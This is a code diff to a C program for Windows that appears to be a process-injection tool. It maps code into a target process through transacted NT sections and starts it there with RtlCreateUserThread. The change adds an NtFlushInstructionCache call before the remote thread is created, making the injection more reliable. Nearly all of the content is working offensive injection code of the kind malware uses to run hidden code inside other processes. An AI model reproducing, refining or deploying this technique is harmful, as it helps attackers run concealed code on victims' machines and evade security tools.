@@ -14,11 +14,12 @@ typedef struct MY_CLIENT_ID
 	PVOID UniqueThread;
 } MY_CLIENT_ID, * MY_PCLIENT_ID;
 
-typedef NTSTATUS(__stdcall* NTCREATESECTION)(HANDLE*, ULONG, POBJECT_ATTRIBUTES, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
-typedef NTSTATUS(__stdcall* NTMAPVIEWOFSECTION)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
-typedef NTSTATUS(__stdcall* NTCREATETRANSACTION)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);
-typedef NTSTATUS(__stdcall* RTLCREATEUSERTHREAD)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, MY_PCLIENT_ID);
-typedef NTSTATUS(__stdcall* NTCLOSE)(HANDLE);
+typedef NTSTATUS(NTAPI* NTCREATESECTION)(HANDLE*, ULONG, POBJECT_ATTRIBUTES, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
+typedef NTSTATUS(NTAPI* NTMAPVIEWOFSECTION)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
+typedef NTSTATUS(NTAPI* NTCREATETRANSACTION)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);
+typedef NTSTATUS(NTAPI* RTLCREATEUSERTHREAD)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, MY_PCLIENT_ID);
+typedef NTSTATUS(NTAPI* NTCLOSE)(HANDLE);
+typedef NTSTATUS(NTAPI* NTFLUSHINSTRUCTIONCACHE)(HANDLE, PVOID, ULONG);
 // ReSharper restore CppInconsistentNaming
 
 BOOL CheckRelocRange(PBYTE pRelocBuf, UINT dwStartRVA, UINT dwEndRVA);
@@ -55,6 +56,7 @@ INT main() {
 	NTCREATETRANSACTION		pNtCreateTransaction;
 	RTLCREATEUSERTHREAD		pRtlCreateUserThread;
 	NTCLOSE					pNtClose;
+	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache;
 
 	//
 	// Load required functions from ntdll
@@ -65,6 +67,7 @@ INT main() {
 	pNtCreateTransaction = (NTCREATETRANSACTION)GetProcAddress(hNtdll, "NtCreateTransaction");
 	pRtlCreateUserThread = (RTLCREATEUSERTHREAD)GetProcAddress(hNtdll, "RtlCreateUserThread");
 	pNtClose = (NTCLOSE)GetProcAddress(hNtdll, "NtClose");
+	pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)GetProcAddress(hNtdll, "NtFlushInstructionCache");
 	if (hNtdll) {
 		FreeLibrary(hNtdll);
 	}
@@ -296,12 +299,16 @@ INT main() {
 		FindClose(hFind);
 	}
 
-	ntStatus = pRtlCreateUserThread(hProcess/*GetCurrentProcess()*/, NULL, FALSE, 0, 0, 0, pMappedCode, NULL, &hTread, NULL);
+	ntStatus = pNtFlushInstructionCache(hProcess/*GetCurrentProcess()*/, pMappedCode, dwReqBufSize);
 	if (NT_SUCCESS(ntStatus)) {
-		puts("[+] Successfully started a thread in the remote process");
-	}
-	else {
-		printf("[-] Failed to create a thread in target process (error 0x%lx)\r\n", ntStatus);
+		
+		ntStatus = pRtlCreateUserThread(hProcess/*GetCurrentProcess()*/, NULL, FALSE, 0, 0, 0, pMappedCode, NULL, &hTread, NULL);
+		if (NT_SUCCESS(ntStatus)) {
+			puts("[+] Successfully started a thread in the remote process");
+		}
+		else {
+			printf("[-] Failed to create a thread in target process (error 0x%lx)\r\n", ntStatus);
+		}
 	}
 
 	//((fnAddr)pMappedCode)();
